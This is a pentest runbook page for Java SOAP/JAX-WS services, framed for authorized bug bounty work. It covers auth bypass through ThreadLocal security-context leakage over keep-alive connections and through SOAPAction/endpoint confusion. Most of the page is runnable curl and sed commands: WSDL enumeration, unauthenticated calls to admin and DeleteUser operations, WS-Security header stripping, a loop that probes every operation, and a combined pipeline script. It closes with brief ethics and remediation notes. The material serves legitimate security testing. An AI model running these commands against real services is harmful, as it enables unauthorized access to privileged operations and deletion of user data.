---
title: "SOAP / JAX-WS & ThreadLocal Auth Bypass"
description: "Exploiting shared ThreadLocal security context across requests and SOAP action/endpoint confusion in Java web services."
phase: Web
order: 73
tags:
  - soap
  - jax-ws
  - java
  - authentication
tools:
  - curl
  - burp suite
  - jq
updated: 2026-10-01
---

A SOAP/JAX-WS auth bypass runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: exploit a `ThreadLocal` security context that leaks across pooled requests, or SOAPAction/endpoint confusion, to call a privileged operation without valid credentials.

## 1. Enumerate the service

```bash
curl -s "https://target.com/service?wsdl" -o service.wsdl
grep -oE '<wsdl:operation name="[^"]+"' service.wsdl | cut -d'"' -f2 | sort -u
grep -oE '<soap:operation soapAction="[^"]*"' service.wsdl | sort -u
```

Identify which operations are admin-only and where auth is enforced.

## 2. Understand the ThreadLocal pattern

```java
// Handler sets identity at request start
SecurityContext.set(user);
// If remove() is never called, a pooled thread keeps it for the next request
```

## 3. Leak identity over a keep-alive connection

```bash
# Request 1: valid authenticated SOAP call
curl -s --http1.1 -H "Connection: keep-alive" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"urn:GetProfile\"" \
  --data-binary @auth_call.xml "https://target.com/service"

# Request 2: no auth, same connection — watch for inherited identity
curl -s --http1.1 -H "Connection: keep-alive" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"urn:AdminListUsers\"" \
  --data-binary @noauth_call.xml "https://target.com/service"
```

Run both through Burp on a single connection to make the reuse explicit.

## 4. SOAPAction and endpoint confusion

```bash
# Change SOAPAction while hitting the same endpoint
curl -s -X POST "https://target.com/service" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"urn:DeleteUser\"" --data-binary @body.xml -i

# Strip WS-Security headers
sed '/<wsse:Security/,/<\/wsse:Security>/d' auth_call.xml > stripped.xml
curl -s -X POST "https://target.com/service" \
  -H "Content-Type: text/xml; charset=utf-8" --data-binary @stripped.xml -i
```

Also reuse a valid `UsernameToken`/`BinarySecurityToken` across different operations.

## 5. Test every operation unauthenticated

```bash
OPS=$(grep -oE '<wsdl:operation name="[^"]+"' service.wsdl | cut -d'"' -f2)
for op in $OPS; do
  curl -s -o /dev/null -w "$op -> %{http_code}\n" -X POST \
    "https://target.com/service" \
    -H "Content-Type: text/xml; charset=utf-8" \
    -H "SOAPAction: \"urn:$op\"" --data-binary @noauth_call.xml
done
```

## Full pipeline

```bash
B="https://target.com"
curl -s "$B/service?wsdl" -o service.wsdl
grep -oE '<wsdl:operation name="[^"]+"' service.wsdl | cut -d'"' -f2 | sort -u
curl -s --http1.1 -H "Connection: keep-alive" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"urn:GetProfile\"" --data-binary @auth_call.xml "$B/service" | jq -R .
curl -s --http1.1 -H "Connection: keep-alive" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"urn:AdminListUsers\"" --data-binary @noauth_call.xml "$B/service"
curl -s -X POST "$B/service" -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"urn:DeleteUser\"" --data-binary @body.xml -i
sed '/<wsse:Security/,/<\/wsse:Security>/d' auth_call.xml > stripped.xml
curl -s -X POST "$B/service" -H "Content-Type: text/xml; charset=utf-8" \
  --data-binary @stripped.xml -i
```

## Ethics & legality

- Only call operations against test accounts and data; never mutate production state.
- Prove leakage with a canary identity and a read-only privileged call where possible.
- ThreadLocal bugs are flaky — reproduce deliberately on a single connection rather than hammering.
- Recommend clearing `ThreadLocal` in a `finally` block and re-validating per message in the report.
